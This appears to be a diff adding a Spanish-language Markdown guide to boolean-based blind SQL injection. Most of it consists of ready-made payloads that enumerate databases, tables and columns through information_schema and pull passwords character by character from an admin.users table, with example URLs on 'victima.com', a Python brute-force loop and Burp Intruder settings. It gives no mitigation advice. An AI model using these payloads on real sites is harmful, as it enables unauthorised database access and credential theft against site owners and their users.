@@ -1,0 +1,358 @@
+# Que es un ataque blind SQL injection Boolean Based?
+Blind SQL Injection Boolean Based es un tipo de ataque a bases de datos donde el atacante envía consultas maliciosas a una página web para obtener información, pero la página no muestra directamente los datos.
+
+En lugar de eso, la página responde con "sí" o "no" (verdadero o falso) según si la consulta que puso el atacante es cierta o falsa.
+
+Por ejemplo, el atacante puede preguntar:
+
+"¿La primera letra del nombre de usuario es una 'a'?"
+
+Si la página responde igual que cuando la respuesta es verdadera, sabe que la letra es 'a'. Si responde diferente, sabe que no lo es.
+
+Repite estas preguntas cambiando letras y posiciones para ir descubriendo poco a poco la información que quiere, como nombres de bases de datos, tablas o contraseñas, sin que la página muestre los datos directamente.
+
+# ¿como detecto el verdadero o falso?
+
+Cuando haces una consulta maliciosa, la página web responde de alguna forma. No te muestra directamente los datos, pero el comportamiento o la respuesta cambia según si la condición es verdadera o falsa.
+
+Por ejemplo:
+
+Si la condición es verdadera:
+La página carga normalmente, muestra el contenido habitual, o responde con un código HTTP 200 y el mismo tamaño o estructura de la página que sin la inyección.
+
+Si la condición es falsa:
+La página puede mostrar un error, una página vacía, un mensaje distinto, o el código HTTP puede cambiar (por ejemplo 500, 403, o 404). También puede cambiar el tamaño de la respuesta (la longitud del HTML) o cualquier otro detalle visible o medible.
+
+# Cómo detectar esto en práctica
+
+1- Haces una petición “normal” sin inyección y guardas cómo responde (estatus, tamaño de respuesta, contenido).
+
+2- Envías la consulta inyectada con una condición que esperas que sea verdadera (por ejemplo, que la primera letra sea 'a').
+
+3- Compruebas si la respuesta es igual a la normal (por ejemplo, misma longitud, mismo código HTTP). Si es igual, la condición es verdadera.
+
+4- Cambias la condición (por ejemplo, pruebo con 'b') y si la respuesta cambia (más corta, error, diferente), la condición es falsa.
+
+Así, comparando cómo responde la página ante diferentes consultas, puedes ir adivinando carácter por carácter la información oculta.
+
+
+
+# Blind SQL Injection Boolean Based — Enumeración con iteración
+
+Cuando detectamos una inyección Boolean Based Blind SQL, obtenemos respuestas verdadero/falso. Por eso se usa iteración para extraer información carácter a carácter.
+
+---
+
+## Paso 1: Encontrar nombres de bases de datos
+
+La consulta para obtener el carácter en la posición `pos` del nombre de la base de datos número `N` es:
+
+```sql
+' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT N,1), pos, 1)) = X -- -
+```
+
+Donde:
+
+- `N` es el índice del nombre de base de datos (0, 1, 2, ...)
+- `pos` es la posición del carácter dentro del nombre (1, 2, 3, ...)
+- `X` es el código ASCII del carácter que se prueba (por ejemplo, 97 para 'a')
+
+Para iterar la letra y posición, se prueba con diferentes valores de `X` (normalmente entre 32 y 126) y se aumenta `pos` hasta que no haya más caracteres (lo que se detecta porque la condición devuelve falso).
+
+---
+
+## Paso 2: Enumerar tablas de una base de datos específica
+
+Para la base de datos `nombre_bd`, usamos:
+
+```sql
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='nombre_bd' LIMIT N,1), pos, 1)) = X -- -
+```
+
+---
+
+## Paso 3: Enumerar columnas de una tabla
+
+Para la tabla `nombre_tabla` dentro de la base `nombre_bd`:
+
+```sql
+' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='nombre_bd' AND table_name='nombre_tabla' LIMIT N,1), pos, 1)) = X -- -
+```
+
+---
+---
+### Cómo extraer los datos de las columnas
+Una vez que tienes el nombre de la base de datos, las tablas y las columnas, puedes extraer el contenido de las columnas de forma similar, iterando carácter a carácter.
+
+Por ejemplo, para extraer el valor de la columna columna de la fila N en la tabla nombre_tabla de la base nombre_bd:
+```sql
+' AND ASCII(SUBSTRING((SELECT columna FROM nombre_bd.nombre_tabla LIMIT N,1), pos, 1)) = X -- -
+```
+Aquí:
+
+N es el índice de la fila (0 para la primera fila, 1 para la segunda, etc.).
+
+pos es la posición del carácter en el valor de la columna.
+
+X es el valor ASCII que se prueba.
+
+Este método permite extraer cualquier dato almacenado, letra a letra.
+
+---
+
+## Ejemplo con una URL vulnerable
+
+Supongamos que tienes una URL vulnerable como esta:
+
+```
+http://victima.com/product.php?id=1
+```
+
+Para extraer la primera letra de la **primera base de datos** (`N=0`, `pos=1`), prueba:
+
+```
+http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))=97 -- -
+```
+
+Si la respuesta es **igual** a la de una petición normal (por ejemplo, se carga bien la página), significa que el carácter **sí** es `'a'`.
+
+Si cambia (error o comportamiento diferente), pruebas otro valor de `X`, por ejemplo 98, 99… hasta acertar el carácter.
+
+Para la **segunda base de datos** (`N=1`), usas:
+
+```
+http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1,1),1,1))=X -- -
+```
+
+Y para la tercera:
+
+```
+http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 2,1),1,1))=X -- -
+```
+
+Del mismo modo, para obtener la **segunda tabla** (`N=1`) de la base `admin`:
+
+```
+http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='admin' LIMIT 1,1),1,1))=X -- -
+```
+
+Y para la **tercera columna** de la tabla `users`:
+
+```
+http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='admin' AND table_name='users' LIMIT 2,1),1,1))=X -- -
+```
+
+Para extraer el primer carácter de la primera fila de la columna password en la tabla users:
+
+```
+http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT password FROM admin.users LIMIT 0,1),1,1))=X -- -
+```
+---
+
+## Ejemplo simplificado en pseudocódigo
+
+```python
+for N in range(0, total_bases):
+    nombre = ""
+    pos = 1
+    while True:
+        encontrado = False
+        for X in range(32, 127):
+            payload = f"' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {N},1), {pos}, 1)) = {X} -- -"
+            if consulta_boolean(payload):  # función que hace la consulta y devuelve True o False
+                nombre += chr(X)
+                pos += 1
+                encontrado = True
+                break
+        if not encontrado:
+            break
+    print(f'Base {N}: {nombre}')
+
+```
+
+---
+
+### Para tablas:
+
+```python
+payload = f"' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{nombre_bd}' LIMIT {N},1), {pos}, 1)) = {X} -- -"
+```
+
+---
+
+### Para columnas:
+
+```python
+payload = f"' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='{nombre_bd}' AND table_name='{nombre_tabla}' LIMIT {N},1), {pos}, 1)) = {X} -- -"
+```
+
+---
+
+---
+
+### Para extraer datos de columnas:
+
+```
+payload = f"' AND ASCII(SUBSTRING((SELECT {nombre_columna} FROM {nombre_bd}.{nombre_tabla} LIMIT {N},1), {pos}, 1)) = {X} -- -"
+```
+
+
+---
+
+
+## Resumen
+
+- Usar la función SQL `SUBSTRING` para extraer caracteres uno a uno.
+- Usar `ASCII()` para comparar el carácter con un número.
+- Usar `LIMIT N,1` para iterar sobre cada nombre (base, tabla, columna).
+- Iterar `pos` para avanzar letra a letra.
+- Iterar `X` para encontrar el valor ASCII correcto.
+- Cuando no se encuentra ningún carácter para una `pos`, se asume fin del nombre.
+
+---
+# Blind SQL Injection Boolean Based — Automatización con Burp Suite Intruder
+
+Esta guía te muestra cómo automatizar la enumeración de bases de datos, tablas y columnas en una SQLi ciega (boolean based) usando **Burp Suite Intruder**.
+
+---
+
+## 💡 Contexto de la inyección
+
+Supón que tienes una URL vulnerable como esta:
+
+```
+http://victima.com/product.php?id=1
+```
+
+Y comprobaste que una inyección del tipo:
+
+```
+' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)) = 97 -- -
+```
+
+te da respuesta diferente si el carácter **sí** es `'a'` (ASCII 97).
+
+---
+
+## 🔧 Configurar Burp Intruder
+
+### 1. Captura la petición en Burp
+
+Visita la URL vulnerable en tu navegador con Burp activado:
+
+http://victima.com/product.php?id=1
+
+Y envíala al **Intruder** (`Right-click > Send to Intruder`).
+
+---
+
+### 2. Configura los payloads
+
+#### Positions tab
+
+En el parámetro `id`, deja solo un marcador donde irá el valor ASCII.
+
+Para extraer **nombres de bases de datos**, por ejemplo:
+
+    id=1' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))=§X§ -- -
+
+Para extraer **nombres de tablas** de la base `admin`:
+
+    id=1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='admin' LIMIT 0,1),1,1))=§X§ -- -
+
+Para extraer **nombres de columnas** de la tabla `users` en la base `admin`:
+
+    id=1' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='admin' AND table_name='users' LIMIT 0,1),1,1))=§X§ -- -
+
+Para extraer **datos específicos de una columna**, por ejemplo la columna `password` de la tabla `users` en la base `admin` (fila 0, primer carácter):
+
+    id=1' AND ASCII(SUBSTRING((SELECT password FROM admin.users LIMIT 0,1),1,1))=§X§ -- -
+
+(`§X§` será el payload que variará, del 32 al 126)
+
+---
+
+#### Payloads tab
+
+- **Payload type**: Numbers  
+- **From**: 32  
+- **To**: 126  
+- **Step**: 1  
+- Opcional: Marca "Add encoding" si el servidor escapa caracteres  
+
+---
+
+### 3. Iniciar ataque
+
+Haz clic en **Start Attack**.
+
+Burp enviará la misma petición con valores de ASCII del 32 al 126 para la letra 1 (`pos=1`) del elemento (base, tabla, columna o dato) seleccionado.
+
+---
+
+## 🔍 Cómo interpretar resultados
+
+En la tabla de resultados, mira la columna **Length**, **Status** o el contenido de la respuesta.
+
+- Cuando el valor ASCII **coincide**, la página responde **igual que una válida** (por ejemplo, status 200 con contenido similar).
+- Cuando no coincide, hay un cambio visible (menor longitud, error, redirección, etc.).
+
+💡 Usa la columna "Length" como indicador principal. Marca manualmente cuál valor da `true`, tradúcelo a `chr(X)`, y guarda esa letra.
+
+---
+
+## 🔁 Para iterar posiciones y elementos
+
+Para seguir con la **segunda letra** del nombre o dato:
+
+    ... SUBSTRING(...,2,1))=§X§ -- -
+
+Para la **segunda base de datos**:
+
+    ... schemata LIMIT 1,1 ...
+
+Para la **segunda tabla** de la base `admin`:
+
+    ... FROM information_schema.tables WHERE table_schema='admin' LIMIT 1,1 ...
+
+Para la **segunda columna** de la tabla `users`:
+
+    ... FROM information_schema.columns WHERE table_schema='admin' AND table_name='users' LIMIT 1,1 ...
+
+Para la **segunda fila** (registro) de datos en la columna `password`:
+
+    ... FROM admin.users LIMIT 1,1 ...
+
+---
+
+## 📌 Consejos útiles
+
+- Guarda cada letra extraída y reconstruye el nombre o dato completo paso a paso.
+- Usa funciones como `BURP -> Intruder -> Cluster bomb` para automatizar variaciones de `X` (ASCII) y `pos` (posición).
+- Para acelerar, puedes usar comparaciones binarias (`>`, `<`) y hacer búsquedas binarias.
+
+---
+
+## ✅ Resumen del proceso
+
+| Acción                | Modifica                                 |
+|-----------------------|-----------------------------------------|
+| Otra base             | `LIMIT N,1` en `information_schema.schemata`        |
+| Otra letra            | `SUBSTRING(..., pos, 1)`                 |
+| Otra tabla            | `FROM information_schema.tables WHERE table_schema='NOMBRE' LIMIT N,1`  |
+| Otra columna          | `FROM information_schema.columns WHERE table_schema='NOMBRE' AND table_name='TABLA' LIMIT N,1` |
+| Otro dato en columna  | `FROM admin.users LIMIT N,1` para fila, y `SUBSTRING(..., pos, 1)` para letra |
+
+---
+
+## 📎 Ejemplos generales de payloads
+
+- Extraer la **tercera letra** de la **primera columna** de la tabla `users` en la base `admin`:
+
+    ' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='admin' AND table_name='users' LIMIT 0,1),3,1))=§X§ -- -
+
+- Extraer la **primera letra** de la **primera fila** de la columna `password` de la tabla `users` en la base `admin`:
+
+    ' AND ASCII(SUBSTRING((SELECT password FROM admin.users LIMIT 0,1),1,1))=§X§ -- -
+
+---
